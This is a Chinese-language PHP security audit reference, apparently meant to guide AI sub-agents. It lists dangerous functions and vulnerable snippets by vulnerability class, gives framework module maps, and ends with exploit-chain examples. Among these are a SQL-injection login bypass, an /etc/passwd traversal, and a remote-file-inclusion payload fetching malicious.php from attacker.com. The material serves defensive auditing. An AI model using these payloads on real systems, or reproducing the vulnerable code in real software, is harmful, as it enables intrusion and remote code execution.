# PHP 代码审计参考

本参考用于审计 PHP Web 应用，识别漏洞和攻击面。

## 技术识别

**文件指示器**：
- `composer.json` - PHP 依赖管理
- `public/index.php` - 常见入口点
- `app/`, `src/` - 应用代码
- `.env` - 环境配置
- `vendor/` - Composer 依赖

**常见框架**：
- Laravel - `app/Http/Controllers/`, `routes/web.php`
- ThinkPHP - `application/`, `route/`
- CodeIgniter - `application/controllers/`, `application/models/`
- 原生 PHP - `*.php` 散落

---

## 高风险区域

### 1. 认证与会话

**危险函数/模式**：
```php
// 不安全的SESSION配置
session_start(); // 检查是否验证session_regenerate_id()

// 弱密码比较
if ($password == $user_input) // 应使用password_verify()

// 硬编码凭证
$conn = new mysqli("localhost", "root", "password", "db");
```

**审计重点**：
- `session_start()` 后是否调用 `session_regenerate_id()`
- 密码是否使用 `password_hash()`/`password_verify()`
- 会话是否设置 `httponly`, `secure`, `samesite` 标志
- 是否存在无限期有效的会话

### 2. SQL 注入

**危险模式**：
```php
// 字符串拼接SQL（高危）
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($conn, $query);

// 预处理语句（安全）
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
```

**审计重点**：
- 搜索 `mysqli_query()`, `mysql_query()`, `pg_query()`
- 搜索 `SELECT`, `INSERT`, `UPDATE`, `DELETE` 与用户输入拼接
- 检查 ORM 使用是否正确（Eloquent, Doctrine）
- 搜索 `$_GET`, `$_POST`, `$_REQUEST` 直接进入 SQL

### 3. 命令注入

**危险函数**：
```php
system($_GET['cmd']);           // 极高危
exec($_POST['command']);        // 极高危
shell_exec($user_input);       // 极高危
passthru($_GET['c']);          // 极高危
popen($_REQUEST['c'], 'r');    // 极高危
proc_open($_GET['c'], ...);    // 极高危
```

**审计重点**：
- 搜索上述危险函数调用
- 检查用户输入是否经过 `escapeshellcmd()` 或 `escapeshellarg()`
- 寻找 `eval()` 调用（极高危）

### 4. 文件操作

**危险函数**：
```php
include($_GET['file']);         // 极高危 - 本地文件包含
require($_POST['path']);        // 极高危
include_once($_REQUEST['t']);   // 高危
file_get_contents($_GET['f']); // 高危
file_put_contents($_GET['f'], $data); // 高危
unlink($_GET['del']);          // 高危
rmdir($_GET['dir']);           // 高危
```

**审计重点**：
- 文件包含是否限制扩展名或路径
- 用户输入是否经过 `basename()`, `realpath()` 验证
- 上传文件是否验证 `Content-Type`, 扩展名, 内容
- 搜索 `$_GET['file']`, `$_POST['path']` 进入 include/require

### 5. XSS（跨站脚本）

**危险输出模式**：
```php
// 未经编码输出
echo $_GET['name'];                    // 高危
<div><?= $user_input ?></div>          // 高危
<a href="<?= $url ?>">link</a>        // 高危
<script>var x = "<?= $data ?>";</script> // 极高危
```

**审计重点**：
- 搜索 `echo`, `print`, `printf`, `<?=` 直接输出用户输入
- 检查是否使用 `htmlspecialchars()`, `strip_tags()`, `ENT_QUOTES`
- 检查 JSON 输出是否使用 `json_encode()`
- 检查 HTTP 头是否设置 `Content-Type` 防止 MIME 类型嗅探

### 6. 反序列化

**危险函数**：
```php
unserialize($_COOKIE['data']);  // 极高危
unserialize(file_get_contents('cache.txt')); // 高危
```

**审计重点**：
- 搜索 `unserialize()` 调用
- 检查是否使用 `json_decode()` 替代
- PHPGGC 等工具可生成反序列化 payload

### 7. 路径遍历

**危险模式**：
```php
$file = $_GET['page'] . '.php';
include($file);                   // 高危

$path = $_GET['dir'] . '/' . $_GET['file'];
readfile($path);                  // 高危
```

**审计重点**：
- 搜索 `$_GET`, `$_POST` 进入文件路径函数
- 检查是否使用 `basename()`, `realpath()` 净化路径

### 8. CSRF（跨站请求伪造）

**审计重点**：
- 检查表单是否使用 `CSRF` token
- 检查是否验证 `Referer`/`Origin` 头
- 搜索 `$_SERVER['HTTP_REFERER']` 验证

---

## 模块划分建议

**Laravel 项目**：

| 模块 | 路径 | 审计重点 |
|------|------|----------|
| 路由 | `routes/web.php`, `routes/api.php` | 未授权访问 |
| 控制器 | `app/Http/Controllers/` | 认证、授权、输入验证 |
| 模型 | `app/Models/` | 批量赋值、ORM 安全 |
| 中间件 | `app/Http/Middleware/` | CSRF、会话、认证 |
| 视图 | `resources/views/` | XSS |
| 配置 | `config/`, `.env` | 秘密泄露、调试模式 |

**ThinkPHP 项目**：

| 模块 | 路径 | 审计重点 |
|------|------|----------|
| 控制器 | `application/index/controller/` | 认证、输入验证 |
| 模型 | `application/index/model/` | SQL 注入 |
| 视图 | `application/index/view/` | XSS |
| 配置 | `application/database.php` | 凭证硬编码 |

**原生 PHP 项目**：

| 模块 | 路径 | 审计重点 |
|------|------|----------|
| 入口 | `public/index.php` | 初始重定向、session 启动 |
| 公共 | `common/`, `includes/` | 被多个文件包含的函数 |
| 处理 | `action/`, `do/` | 表单处理逻辑 |
| 配置 | `config.php` | 凭证、数据库连接 |

---

## 漏洞利用链示例

### SQL注入 → 认证绕过

```
用户输入 → 拼接到SQL → mysqli_query() → 认证绕过
```

```php
// 漏洞代码
$query = "SELECT * FROM users WHERE username='{$_POST['user']}' AND password='{$_POST['pass']}'";
// 攻击输入: user=admin'-- password=anything
// 结果: SELECT * FROM users WHERE username='admin'--' AND password='...'
// 注释掉密码检查，直接登录
```

### 文件包含 → RCE

```
文件上传 → include() → 包含恶意文件 → RCE
```

```php
// 漏洞代码
$file = $_GET['page'];
include($file);
// 攻击: ?page=../../../../../../../../etc/passwd
// 或: ?page=https://attacker.com/malicious.php
```

### 反序列化 → RCE

```php
// 漏洞代码
$data = unserialize($_COOKIE['session']);
// POP chain: __destruct() → file_put_contents() → 写webshell
```

---

## CVE 常见模式

| 类型 | PHP 相关 CVE | 说明 |
|------|-------------|------|
| SQLi | CVE-2017-9840 (ThinkPHP) | 框架级 SQL 注入 |
| RCE | CVE-2018-15133 (Laravel) | 反序列化 RCE |
| LFI | CVE-2015-4051 (phpMyFAQ) | 文件包含 |
| Auth Bypass | CVE-2019-9641 (Laravel) | 绕过认证 |
| SSRF | CVE-2020-24148 (WordPress) | 服务端请求伪造 |

---

## 下一步

1. 在 `workspace/00-work-background.md` 记录 PHP 版本、框架、关键文件
2. 在 `workspace/01-module-map.md` 划分模块
3. 为每个模块创建子 Agent 工作区，使用本参考作为审计指南
4. 发现漏洞后，追踪 Source → Sink 完整调用链
